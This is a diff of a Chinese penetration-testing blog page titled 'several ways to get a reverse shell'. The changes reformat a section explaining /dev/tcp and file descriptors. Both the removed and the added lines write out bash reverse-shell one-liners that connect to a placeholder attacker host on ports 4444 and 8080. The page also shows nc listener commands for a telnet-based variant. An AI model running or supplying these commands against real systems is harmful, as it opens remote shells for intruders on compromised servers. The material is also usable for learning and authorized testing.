@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="Brucetg&#39;s Blog">
 <meta property="og:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-03T14:04:33.007Z">
+<meta property="og:updated_time" content="2018-05-03T14:26:43.359Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="多种姿势反弹shell">
 <meta name="twitter:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。">
@@ -206,23 +206,20 @@
 <p>  <strong>注：</strong></p>
 <p>  <strong>/dev/tcp/</strong>  是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p>
 <p>  linux shell下常用的文件描述符是：</p>
-<ol>
-<li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>
-</li>
-<li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>
-</li>
-<li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
-<p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p>
-<p><strong>其他版本：</strong></p>
-<p>方法一：</p>
-<p>exec /bin/bash 0&amp;0 2&gt;&amp;0</p>
-<p>方法二：</p>
-<p>0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p>
-<p>方法三：</p>
-<p>exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done  # 或者: while read line 0&lt;&5; do $line 2&gt;&amp;5 &gt;&5; done</p>
-</li>
-</ol>
-<h2 id="0x02-telnet反弹"><a href="#0x02-telnet反弹" class="headerlink" title="0x02. telnet反弹"></a>0x02. telnet反弹</h2><p>  攻击者主机上打开两个终端分别执行监听：</p>
+<p>   1.标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>
+<p>   2.标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>
+<p>   3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
+<p>  另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p>
+<p>  <strong>其他版本：</strong></p>
+<p>  方法二：</p>
+<pre><code>exec 0&amp;0 2&gt;&amp;0
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/x.x.x.x/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+/bin/bash  -i &gt; /dev/tcp/x.x.x.x/8080 0&lt;&amp;1 2&gt;&amp;1
+</code></pre><p>  方法三：</p>
+<pre><code>exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
+</code></pre><h2 id="0x02-telnet反弹"><a href="#0x02-telnet反弹" class="headerlink" title="0x02. telnet反弹"></a>0x02. telnet反弹</h2><p>  攻击者主机上打开两个终端分别执行监听：</p>
 <pre><code>nc -lvvp 4444
 
 nc -lvvp 5555
@@ -563,11 +560,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Kali Linux、mysql-sniffer</a>
+                <a href="javascript:void(0)" class="js-tag color5">Eclipse Spring</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Eclipse Spring</a>
+                <a href="javascript:void(0)" class="js-tag color5">Kali Linux、mysql-sniffer</a>
               </li>
              
               <li class="article-tag-list-item">
